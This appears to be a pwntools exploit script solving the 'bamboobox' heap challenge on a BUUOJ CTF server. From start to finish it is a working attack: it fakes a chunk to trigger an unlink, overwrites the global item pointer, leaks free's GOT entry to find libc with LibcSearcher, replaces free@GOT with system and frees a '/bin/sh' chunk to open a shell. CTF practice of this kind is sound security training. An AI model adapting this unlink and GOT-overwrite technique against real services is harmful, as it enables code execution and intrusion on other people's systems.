from pwn import*
from LibcSearcher3 import*
elf=ELF('bamboobox')
p=remote('node4.buuoj.cn',28418)
#p=process('./bamboobox')
context.log_level='debug'

prt=0x6020c8

def show():
    p.sendlineafter(b'Your choice:',b'1')
def add(length,name):
    p.sendlineafter(b'Your choice:',b'2')
    p.sendlineafter(b'Please enter the length of item name:',str(length).encode('latin'))
    p.sendlineafter(b'Please enter the name of item:',name)
def change(index,length,name):
    p.sendlineafter(b'Your choice:',b'3')
    p.sendlineafter(b'Please enter the index of item:',str(index).encode('latin'))
    p.sendlineafter(b'Please enter the length of item name:',str(length).encode('latin'))
    p.sendafter(b'Please enter the new name of the item:',name)
def remove(index):
    p.sendlineafter(b'Your choice:',b'4')
    p.sendlineafter(b'Please enter the index of item:',str(index).encode('latin'))

add(0x20,b'a')
add(0x80,b'a')
add(0x10,b'/bin/sh\x00')
payload=p64(0)+p64(0x20)+p64(prt-0x18)+p64(prt-0x10)+p64(0x20)+b'\x90'
change(0,len(payload),payload)
remove(1)
payload=p64(0)*2+p64(0x20)+p64(elf.got['free'])#+p64(0)+p64(0)+p64(0x10)+p64(0x6020e8)
change(0,len(payload),payload)
show()
free_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(free_addr))

libc=LibcSearcher('free',free_addr)
libcbase=free_addr-libc.dump('free')
sys_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')
payload=p64(sys_addr)
change(0,len(payload),payload)
remove(2)
p.interactive()